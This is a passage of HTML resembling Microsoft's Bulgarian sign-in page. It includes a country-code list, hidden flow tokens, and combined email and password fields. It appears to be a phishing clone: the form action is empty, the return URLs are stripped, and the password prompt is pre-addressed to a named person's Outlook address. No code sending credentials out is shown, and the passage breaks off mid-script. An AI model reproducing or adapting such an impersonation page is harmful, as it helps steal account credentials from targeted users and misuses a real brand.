Лешти)~670!!!TG~Того~228!!!TK~Токелау~690!!!TO~Тонга~676!!!TT~Тринидад и Тобаго~1!!!TA~Тристан да Куня~290!!!TN~Тунис~216!!!TR~Турция~90!!!TM~Туркменистан~993!!!TC~Острови Търкс и Кайкос~1!!!TV~Тувалу~688!!!UM~Малки далечни острови на САЩ~1!!!VI~Американски Вирджински острови~1!!!UG~Уганда~256!!!UA~Украйна~380!!!AE~Обединени арабски емирства~971!!!UK~Обединеното кралство~44!!!US~САЩ~1!!!UY~Уругвай~598!!!UZ~Узбекистан~998!!!VU~Вануату~678!!!VA~Ватикан~379!!!VE~Венецуела~58!!!VN~Виетнам~84!!!WF~Уолис и Футуна~681!!!YE~Йемен~967!!!ZM~Замбия~260!!!ZW~Зимбабве~263',Ao:'',BN:false,html:[],BQ:true,iPawnIcon:1,sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="DSiDH2l6KbU5o5XOZlMIJnH93F82PUSeIi9f9zNyP0G6cjLCI5Te3ZgWSm!TtMgM5er*2IYDOQff0Uj411HL6GvVjPoygTW5wmwa81B1mHTKqqUTZ3CLc3L43m8udUyo50QjoKBvwFKDsl5PjZ4zhIaJMMaIMoJJ8jrBIii6Owji4IqdFRO53!eqIJEV8k9u6mDPE2KGf*ozgQ3SaPMx522xLLP*mZ3wCEsf9hVDvmrljsgW2zMzOHwYy7D7HNaJBA$$"/>',Ar:[],At:true,loader:{cdnRoots:['https://logincdn.msauth.net/','https://lgincdnvzeuno.azureedge.net/','https://lgincdnmsftuswe2.azureedge.net/']},Ax:false,BW:false,BY:true,C8:false,fHasBackgroundColor:false,urlStaySignIn:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1649730232&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&contextid=1B586605B1C906B4&mkt=BG-BG&lc=1026&bk=1649730232&uaid=00de9cba0c8e4c7aac15ade45a847ccb',a2:true,CA:false,a8:false,Be:false,CD:false,a9:false,CE:false};var HIP={};</script><script type="text/javascript" src="https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.bg_MYW8YDL_YpfnV214wlTr0w2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-WRGheIKGvexpBbQiKTZ9kAEtE1ZJo67YGsPSUnzd0IMzQvRr3KnNay6X0h+l2pOo"></script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_XlECl70u0wjq9wxuZdlfDQ2.js","ConvergedLogin_PCore","sha384-nJbrYzjZqji7dLviJMz6W9/pZwwZfKyVBQilNLnQC09Dp4Y251qkOAvsZQU0ODt0");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); } type="text/javascript" src="https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_XlECl70u0wjq9wxuZdlfDQ2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-nJbrYzjZqji7dLviJMz6W9/pZwwZfKyVBQilNLnQC09Dp4Y251qkOAvsZQU0ODt0"></script><script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/oneDs_cf88713273157e0b2931.js"></script><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style><script charset="utf-8" src="https://logincdn.msauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_ppassword_bede31abfb64207025ea.js"></script>
   </head>
   <body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
     <div><!--  -->

 <!--  -->

 <div data-bind="if: activeDialog"></div>

 <form name="f1" spellcheck="false" method="post" target="_top" autocomplete="off" action="">

     <!-- ko withProperties: { '$loginPage': $data } -->
     <div class="login-paginated-page" data-bind="component: { name: 'master-page',
         publicMethods: masterPageMethods,
         params: {
             serverData: svr,
             showButtons: svr.e,
             showFooterLinks: true,
             useWizardBehavior: svr.Bz,
             handleWizardButtons: false,
             password: password,
             hideFromAria: ariaHidden },
         event: {
             footerAgreementClick: footer_agreementClick } }"><!--  -->

 <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

 <!-- ko if: useLayoutTemplates -->
     <!-- ko withProperties: { '$page': $parent } -->
         <!-- ko if: isLightboxTemplate() -->
         <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }"><!--  -->

 <div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
     publicMethods: $page.backgroundControlMethods,
     event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
     <!-- ko if: smallImageUrl --><!-- /ko -->

     <!-- ko if: backgroundImageUrl -->
     <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
         <!-- ko if: useImageMask --><!-- /ko -->
     <!-- /ko -->
 </div></div>

 <!-- ko if: svr.cI --><!-- /ko -->

 <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
 <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
     <!-- ko if: showHeader --><!-- /ko -->

     <div class="template-section main-section">
         <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
             <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"><!--  -->

 <!-- ko withProperties: { '$content': $data } -->
 <div class="flex-column">
     <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

     <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

     <div class="win-scroll">
         <div id="lightbox" data-bind="
             animationEnd: $page.paginationControlHelper.animationEnd,
             externalCss: { 'sign-in-box': true },
             css: {
                 'inner':  $content.isVerticalSplitTemplate,
                 'vertical-split-content': $content.isVerticalSplitTemplate,
                 'app': $page.backgroundLogoUrl,
                 'wide': $page.paginationControlHelper.useWiderWidth,
                 'fade-in-lightbox': $page.fadeInLightBox,
                 'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                 'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                 'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

             <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

         <!-- ko if: svr.BN --><!-- /ko -->

         <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.b9 &amp;&amp; showLightboxProgress() }"></div>

         <!-- ko if: showLightboxProgress --><!-- /ko -->

         <!-- ko if: loadBannerLogo -->
         <div data-bind="component: { name: 'logo-control',
             params: {
                 isChinaDc: svr.fIsChinaDc,
                 bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

 <!-- ko if: bannerLogoUrl --><!-- /ko -->

 <!-- ko if: !bannerLogoUrl && !isChinaDc -->
     <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
 <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
 <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
 <!-- /ko --><!-- /ko -->
 <!-- /ko --></div>
         <!-- /ko -->

         <!-- ko if: svr.c6 && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

         <!-- ko if: asyncInitReady -->
         <div role="main" data-bind="component: { name: 'pagination-control',
             publicMethods: paginationControlMethods,
             params: {
                 enableCssAnimation: svr.aw,
                 disableAnimationIfAnimationEndUnsupported: svr.CD,
                 initialViewId: initialViewId,
                 currentViewId: currentViewId,
                 initialSharedData: initialSharedData,
                 initialError: $loginPage.getServerError() },
             event: {
                 cancel: paginationControl_onCancel,
                 load: paginationControlHelper.onLoad,
                 unload: paginationControlHelper.onUnload,
                 loadView: view_onLoadView,
                 showView: view_onShow,
                 setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                 animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

 <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
     <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) --><!-- /ko -->

     <div class="pagination-view animate slide-in-back" data-bind="css: {
         'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
         'zero-opacity': hidePaginatedView.hideSubView(),
         'animate': animate(),
         'slide-out-next': animate.isSlideOutNext(),
         'slide-in-next': animate.isSlideInNext(),
         'slide-out-back': animate.isSlideOutBack(),
         'slide-in-back': animate.isSlideInBack() }">

         <!-- ko foreach: views -->
             <!-- ko if: $parent.currentViewIndex() === $index() -->
                 <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                 params: {
                     serverData: svr,
                     serverError: initialError,
                     isInitialView: isInitialState,
                     displayName: sharedData.displayName,
                     otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                     prefillNames: $loginPage.prefillNames,
                     flowToken: sharedData.flowToken,
                     availableSignupCreds: sharedData.availableSignupCreds },
                 event: {
                     redirect: $loginPage.view_onRedirect,
                     setPendingRequest: $loginPage.view_onSetPendingRequest,
                     registerDialog: $loginPage.view_onRegisterDialog,
                     unregisterDialog: $loginPage.view_onUnregisterDialog,
                     showDialog: $loginPage.view_onShowDialog,
                     updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                     agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

 <div data-bind="component: { name: 'header-control',
     params: {
         serverData: svr,
         title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
     <div role="heading" aria-level="1" data-bind="text: title">Влизане</div>
     <!-- ko if: isSubtitleVisible --><!-- /ko -->
 </div></div>

 <!-- ko if: pageDescription && !svr.CH --><!-- /ko -->

 <div class="row">
     <div role="alert" aria-live="assertive">
         <!-- ko if: usernameTextbox.error --><!-- /ko -->
     </div>

     <div class="form-group col-md-24">
         <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

         <!-- ko ifnot: prefillNames().length > 1 -->
         <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
             publicMethods: usernameTextbox.placeholderTextboxMethods,
             params: {
                 serverData: svr,
                 hintText: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Email_Example'],
                 hintCss: 'placeholder' + (!svr.aR ? ' ltr_override' : '') },
             event: {
                 updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
     <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

             <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" data-bind="
                     attr: { lang: svr.at ? null : 'en' },
                     externalCss: {
                         'input': true,
                         'text-box': true,
                         'has-error': usernameTextbox.error },
                     ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                     ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.CH ? ' loginDescription usernameError' : ' usernameError'),
                     textInput: usernameTextbox.value,
                     hasFocusEx: usernameTextbox.focused,
                     placeholder: $placeholderText" aria-label="Въведете вашия имейл, телефон или Skype." aria-describedby="loginHeader usernameError" placeholder="Имейл, телефон или Skype" data-report-attached="1">
<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader passwordError',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Парола" aria-label="Въведете паролата за ivanbodurov@outlook.com" tabindex="0">

         <!-- /ko -->
 <!-- /ko -->
 <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
         <!-- /ko -->
     </div>
 </div>

 <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
     <div class="row">
         <div class="col-md-24">
             <div class="text-13">
                 <!-- ko if: svr.At && !svr.Ag && !svr.au -->
                 <div class="form-group" data-bind="
                     htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                     childBindings: {
                         'signup': {
                             href: svr.J || '#',
                             ariaLabel: svr.J ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                             click: signup_onClick } }">Не разполагате с акаунт? <a href="#/signup?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1649730232&amp;rver=7.0.6737.0&amp;wp=MBI_SSL&amp;wreply=https%3a%2f%2f#%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3df078d042-b064-8752-17fc-45791893c5e3&amp;id=292841&amp;aadredir=1&amp;CBCXT=out&amp;lw=1&amp;fl=dob%2cflname%2cwld&amp;cobrandid=90015&amp;contextid=1B586605B1C906B4&amp;bk=1649730232&amp;uiflavor=web&amp;lic=1&amp;mkt=BG-BG&amp;lc=1026&amp;uaid=00de9cba0c8e4c7aac15ade45a847ccb" id="signup" aria-label="Създаване на акаунт в Microsoft">Създайте го!</a></div>
                 <!-- /ko -->

                 <!-- ko ifnot: hideCantAccessYourAccount --><!-- /ko -->

                 <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.Ai || isOfflineAccountVisible) -->
                 <div class="form-group">
                     <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" data-bind="
                         text: fidoLinkText,
                         click: switchToFidoCredLink_onClick">Влизане с ключ за защита</a>

                     <!-- ko component: { name: 'fido-help-button-control',
                         params: {
                             isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
                         event: {
                             registerDialog: onRegisterDialog,
                             unregisterDialog: onUnregisterDialog,
                             showDialog: onShowDialog } } --><!--  -->

 <span class="help-button" role="button" tabindex="0" data-bind="
     click: fidoHelp_onClick,
     pressEnter: fidoHelp_onClick,
     hasFocus: hasFocus,
     ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']" aria-label="Научете повече за влизането с ключ за защита">

     <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
 <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
 <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/documentation_9628e22a6bfb1edc59e81064a666b614.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"><!-- /ko -->
 <!-- /ko --><!-- /ko -->
 </span>

 <div data-bind="component: { name: 'fido-help-dialog-content-control',
     params: {
         isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
     event: {
         registerDialog: onRegisterDialog,
         unregisterDialog: onUnregisterDialog } }"><!--  -->

 <div data-bind="component: { name: 'dialog-content-control',
     params: {
         dialogId: 1,
         data: {
             labelledBy: 'fidoDialogTitle',
             describedBy: 'fidoDialogDesc fidoDialogDesc2',
             primaryButtonPreventTabbing: { direction: 'down' },
             isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
     event: {
         registerDialog: onRegisterDialog,
         unregisterDialog: onUnregisterDialog } }"><!-- --></div></div><!-- /ko -->
                 </div>
                 <!-- /ko -->

                 <!-- ko if: showCredPicker --><!-- /ko -->

                 <!-- ko if: svr.aN --><!-- /ko -->
             </div>
         </div>
     </div>
 </div>

 <!-- ko if: svr.Cz --><!-- /ko -->

 <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
     <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
         <div data-bind="component: { name: 'footer-buttons-field',
             params: {
                 serverData: svr,
                 isPrimaryButtonEnabled: !isRequestPending(),
                 isPrimaryButtonVisible: svr.e,
                 isSecondaryButtonEnabled: true,
                 isSecondaryButtonVisible: svr.e &amp;&amp; isSecondaryButtonVisible(),
                 secondaryButtonText: secondaryButtonText() },
             event: {
                 primaryButtonClick: primaryButton_onClick,
                 secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }">

     <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

     <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
         <input type="submit" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Напред" data-report-attached="1">
     </div>
 </div></div>
     </div>
 </div>

 <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
             <!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

             <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
         <!-- /ko -->
     </div>
 </div></div>
         <!-- /ko -->

         <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
         <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
         <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
         <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
         <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
         <input type="hidden" name="ctx" data-bind="value: ctx" value="">
         <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
         <input type="hidden" id="i0327" data-bind="attr: { name: svr.bj }, value: flowToken" name="PPFT" value="DSiDH2l6KbU5o5XOZlMIJnH93F82PUSeIi9f9zNyP0G6cjLCI5Te3ZgWSm!TtMgM5er*2IYDOQff0Uj411HL6GvVjPoygTW5wmwa81B1mHTKqqUTZ3CLc3L43m8udUyo50QjoKBvwFKDsl5PjZ4zhIaJMMaIMoJJ8jrBIii6Owji4IqdFRO53!eqIJEV8k9u6mDPE2KGf*ozgQ3SaPMx522xLLP*mZ3wCEsf9hVDvmrljsgW2zMzOHwYy7D7HNaJBA$$">
         <input type="hidden" name="PPSX" data-bind="value: svr.cz" value="Passport">
         <input type="hidden" name="NewUser" value="1">
         <input type="hidden" name="FoundMSAs" data-bind="value: svr.Al" value="">
         <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
         <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
         <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BN ? 1 : 0" value="0">
         <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
         <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
         <div data-bind="component: { name: 'instrumentation-control',
             publicMethods: instrumentationMethods,
             params: { serverData: svr } }">
 <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
     <!-- /ko -->
         </div>

         <!-- ko if: $page.showFedCredAndNewSession -->
         <!-- ko if: $page.showFedCredButtons -->
         <div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
             <div class="promoted-fed-cred-content" data-bind="css: {
                 'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
                 'slide-out-next': $page.animate.isSlideOutNext,
                 'slide-in-next': $page.animate.isSlideInNext,
                 'slide-out-back': $page.animate.isSlideOutBack,
                 'slide-in-back': $page.animate.isSlideInBack,
                 'app': $page.backgroundLogoUrl }">

                 <!-- ko foreach: $page.otherSigninOptions -->
                 <div class="row tile">
                     <div class="table" role="button" tabindex="0" data-bind="
                         css: { 'list-item': svr.cb },
                         pressEnter: $page.otherSigninOptionsButton_onClick,
                         click: $page.otherSigninOptionsButton_onClick,
                         ariaLabel: $data.text" aria-label="Опции за влизане">

                         <div class="table-row">
                             <div class="table-cell tile-img medium">
                                 <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
 <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
 <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
 <!-- /ko --><!-- /ko -->
                             </div>
                             <div class="table-cell text-left content" data-bind="css: { 'content': !svr.cb }">
                                 <div data-bind="
                                     text: $data.text,
                                     attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Опции за влизане</div>
                             </div>
                         </div>
                     </div>
                 </div>
                 <!-- /ko -->
             </div>
         </div>
         <!-- /ko -->

         <!-- ko if: $page.newSession --><!-- /ko -->
         <!-- /ko -->

         <!-- ko if: $page.showDebugDetails --><!-- /ko -->
     </div>
 </div>
 <!-- /ko --></div>
         </div>
     </div>

     <!-- ko if: $page.paginationControlHelper.showFooterControl -->
     <div id="footer" role="contentinfo" data-bind="
         externalCss: {
             'footer': true,
             'has-background': !$page.useDefaultBackground(),
             'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

         <div data-bind="component: { name: 'footer-control',
             publicMethods: $page.footerMethods,
             params: {
                 serverData: svr,
                 useDefaultBackground: $page.useDefaultBackground(),
                 hasDarkBackground: $page.backgroundLogoUrl(),
                 showLinks: true,
                 showFooter: $page.showFooter(),
                 hideTOU: $page.hideTOU(),
                 termsText: $page.termsText(),
                 termsLink: $page.termsLink(),
                 hidePrivacy: $page.hidePrivacy(),
                 privacyText: $page.privacyText(),
                 privacyLink: $page.privacyLink() },
             event: {
                 agreementClick: $page.footer_agreementClick,
                 showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
 <div id="footerLinks" class="footerNode text-secondary">

     <!-- ko if: showFooter -->
         <!-- ko if: !hideTOU -->
         <a id="ftrTerms" data-bind="
             text: termsText,
             href: termsLink,
             click: termsLink_onClick,
             externalCss: {
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
                 'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=BG-BG&amp;uaid=00de9cba0c8e4c7aac15ade45a847ccb" class="footer-content ext-footer-content footer-item ext-footer-item">Условия на използване</a>
         <!-- /ko -->

         <!-- ko if: !hidePrivacy -->
         <a id="ftrPrivacy" data-bind="
             text: privacyText,
             href: privacyLink,
             click: privacyLink_onClick,
             externalCss: {
                 'footer-content': true,
                 'footer-item': true,
                 'has-background': !useDefaultBackground,
                 'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=BG-BG&amp;uaid=00de9cba0c8e4c7aac15ade45a847ccb" class="footer-content ext-footer-content footer-item ext-footer-item">Поверителност и бисквитки</a>
         <!-- /ko -->

         <!-- ko if: impressumLink --><!-- /ko -->

         <!-- ko if: showIcpLicense --><!-- /ko -->
     <!-- /ko -->

     <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
     <a id="moreOptions" href="#" role="button" data-bind="
         click: moreInfo_onClick,
         ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
         attr: { 'aria-expanded': showDebugDetails().toString() },
         hasFocusEx: focusMoreInfo(),
         externalCss: {
             'footer-content': true,
             'footer-item': true,
             'debug-item': true,
             'has-background': !useDefaultBackground,
             'background-always-visible': hasDarkBackground }" aria-label="Щракнете тук за информация за отстраняване на неизправности" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
 </div>
 <!-- /ko -->

 <!-- ko if: svr.Cz && showLinks --><!-- /ko --></div>
     </div>
     <!-- /ko -->
 </div>
 <!-- /ko --></div>
         <!-- /ko -->

         <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
     <!-- /ko -->
 <!-- /ko --></div>
     <!-- /ko -->
 </form>

 <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

 <!-- ko if: svr.ag -->
 <div id="idPartnerPL" data-bind="injectIframe: { url: svr.ag }"><iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx?id=292841&amp;mkt=BG-BG" style="display: none;"></iframe></div>
 <!-- /ko --></div>
 <script>

